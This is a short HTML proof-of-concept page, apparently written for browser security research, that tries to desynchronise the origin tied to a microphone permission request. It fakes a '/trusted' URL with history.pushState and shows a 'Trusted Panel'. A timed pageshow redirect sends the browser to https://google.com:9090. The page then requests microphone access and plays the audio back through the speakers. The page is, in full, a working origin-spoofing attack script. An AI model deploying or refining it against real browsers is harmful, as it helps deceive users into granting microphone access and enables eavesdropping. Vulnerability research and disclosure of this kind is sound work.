<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Microphone Origin Desync PoC</title>
<meta name="viewport" content="width=device-width, initial-scale=1">

<style>
body {
  font-family: system-ui;
  background:#f5f5f7;
  margin:0;
}
#panel {
  display:none;
  max-width:520px;
  margin:80px auto;
  background:#fff;
  padding:24px;
  border-radius:16px;
  box-shadow:0 20px 60px rgba(0,0,0,.2);
}
button {
  width:100%;
  padding:12px;
  font-size:16px;
  border-radius:10px;
  border:none;
  background:#007aff;
  color:#fff;
}
.notice {
  margin-top:12px;
  font-size:13px;
  color:#b00020;
}
</style>
</head>

<body>

<div style="text-align:center;margin-top:60px">
  <button id="trigger">Start PoC</button>
</div>

<div id="panel">
  <h2>Trusted Panel</h2>
  <p>Microphone will be activated after trust-state navigation.</p>

  <button onclick="useMicrophone()">Activate Microphone</button>

  <div class="notice">
    Demo only — requires user permission
  </div>
</div>

<script>
const trigger = document.getElementById('trigger');
const panel = document.getElementById('panel');

/* =========================
   TRUSTED STATE NAVIGATION
========================= */
trigger.onclick = () => {
  history.pushState({}, '', '/trusted');
  panel.style.display = 'block';
};

/* =========================
   PAGE LIFECYCLE REDIRECT
========================= */
window.addEventListener('pageshow', () => {
  requestAnimationFrame(() => {
    requestAnimationFrame(() => {
      setTimeout(() => {
        location.href = 'https://google.com:9090';
      }, 80);
    });
  });
});

/* =========================
   MICROPHONE ONLY
========================= */
function useMicrophone() {
  navigator.mediaDevices.getUserMedia({ audio: true })
    .then(stream => {
      const ctx = new AudioContext();
      const src = ctx.createMediaStreamSource(stream);
      src.connect(ctx.destination);
    });
}
</script>

</body>
</html>
